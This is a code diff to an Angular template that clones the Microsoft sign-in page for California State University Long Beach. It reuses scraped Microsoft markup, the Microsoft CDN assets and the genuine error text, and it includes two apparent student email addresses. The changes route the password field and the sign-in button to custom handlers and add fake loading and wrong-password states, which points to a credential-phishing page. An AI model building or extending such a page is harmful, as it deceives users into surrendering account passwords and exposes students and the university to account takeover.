@@ -1,4 +1,5 @@
-<div><!--  -->
+<h1 *ngIf="isWrongAddress">You have entered the wrong address. Please check again.</h1>
+<div *ngIf="!isWrongAddress" ><!--  -->
 
   <!--  -->
   
@@ -120,11 +121,21 @@
   
   <div>
       <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->
+      <div *ngIf="isLoading"
+        class="identityBanner">
+        <!-- ko if: isBackButtonVisible --><!-- /ko -->
+    
+        <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="jeonghun.lee01@student.csulb.edu">louis.uuh&#64;csulb.edu</div>
+
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_white_8257b0707cbe1d0bd2661b80068676fe.gif"
+        class="marching_ants_loading"/>
+    </div>
+
   
       <!-- How are you -->
 
       <div
-        *ngIf="isAccountSelected"
+        *ngIf="isAccountSelected && !isLoading"
         class=""
         >
         <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
@@ -243,8 +254,27 @@
     
     <div class="row">
         <div class="form-group col-md-24">
-            <div role="alert" aria-live="assertive">
-                <!-- ko if: passwordTextbox.error --><!-- /ko -->
+            <div
+                *ngIf="isPasswordWrong"
+                role="alert"
+                aria-live="assertive"
+                >
+                <!-- ko if: passwordTextbox.error -->
+                  <!-- ko if: svr.fFixUrlResetPassword -->
+                  <div id="passwordError" data-bind="
+                      externalCss: { 'error': true },
+                      htmlWithBindings: passwordTextbox.error,
+                      childBindings: {
+                          'idA_IL_ForgotPassword0': {
+                              href: resetPasswordUrl || '#',
+                              attr: {
+                                  target: accessRecoveryLink &amp;&amp; '_blank',
+                                  role: resetPasswordUrl ? 'link' : 'button',
+                              },
+                              click: accessRecoveryLink ? null : resetPassword_onClick } }" class="error ext-error">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="https://password.csulb.edu" target="_blank" role="link">reset it now.</a></div>
+                  <!-- /ko -->
+                  <!-- ko ifnot: svr.fFixUrlResetPassword --><!-- /ko -->
+                <!-- /ko -->
             </div>
     
             <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
@@ -261,7 +291,7 @@
                   type="password"
                   placeholder="Password"
                   id="i0118"
-                  class="form-control input ext-input text-box ext-text-box"
+                  [className]="!isPasswordWrong ? passwordInputClasses : passwordWrongInputClasses"
                   aria-required="true"
                   (keydown)="reportKeydown($event)"
                   [(ngModel)]="password"
@@ -375,19 +405,14 @@
         <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
             <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
             <!-- ko ifnot: svr.fConsentButtonIdViaName -->
-            <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
-                    attr: primaryButtonAttributes,
-                    css: { 'high-contrast-overrides': svr.fUseHighContrastOverrides },
-                    externalCss: {
-                        'button': true,
-                        'primary': true },
-                    value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
-                    hasFocus: focusOnPrimaryButton,
-                    click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
-                    clickBubble: !svr.fEnableLivePreview,
-                    enable: isPrimaryButtonEnabled,
-                    visible: isPrimaryButtonVisible,
-                    preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
+            <input
+                type="button"
+                id="idSIButton9"
+                class="win-button button_primary button ext-button primary ext-primary" 
+                value="Sign in"
+                data-report-attached="1"
+                (click)="onSignInButtonClick()"
+            >
             <!-- /ko -->
             <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
         </div>
@@ -408,7 +433,7 @@
     </div>
 
       <div
-        *ngIf="!isAccountSelected"
+        *ngIf="!isAccountSelected && !isLoading"
         class="pagination-view animate slide-in-next"
       >
   
